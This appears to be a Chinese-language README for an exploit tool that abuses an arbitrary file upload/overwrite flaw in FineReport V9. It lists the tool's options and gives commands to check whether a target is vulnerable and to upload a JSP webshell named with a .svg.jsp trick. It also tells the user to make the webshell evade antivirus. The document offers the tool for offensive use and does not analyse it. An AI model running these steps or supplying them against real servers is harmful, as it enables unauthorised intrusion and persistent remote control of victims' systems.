# 帆软（FineReport) V9任意文件上传

本质上是 "任意文件覆盖漏洞", 但可以通过上传文件名为 xxx.svg.jsp 的 WebShell 来实现不覆盖原有文件, 直接创建 xxx.svg.jsp 文件并写入 WebShell.

## 使用方法

```
usage: upload.py [-h] (-u url | -f file) [-lf local_file] [-o output_file]

optional arguments:
  -h, --help      show this help message and exit
  -u url          目标 URL, 如: http://test.com
  -f file         目标 URL 文件
  -lf local_file  需要上传到目标服务器的本地文件, 如: shell.jsp
  -o output_file  保存结果到文本文件

```

### 检测 URL 是否存在漏洞

```
python3 exp.py -u http://oa.test.com:11000
```

![检测 URL 是否存在漏洞](https://github.com/TryA9ain/FineReportV9_Upload/blob/main/images/Pasted%20image%2020230315205243.png)

### 上传 WebShell

>注意 WebShell 免杀的问题

```
python3 exp.py -u http://oa.test.com:11000/ -lf 3.jsp
```

![上传 WebShell](https://github.com/TryA9ain/FineReportV9_Upload/blob/main/images/Pasted%20image%2020230315205546.png)
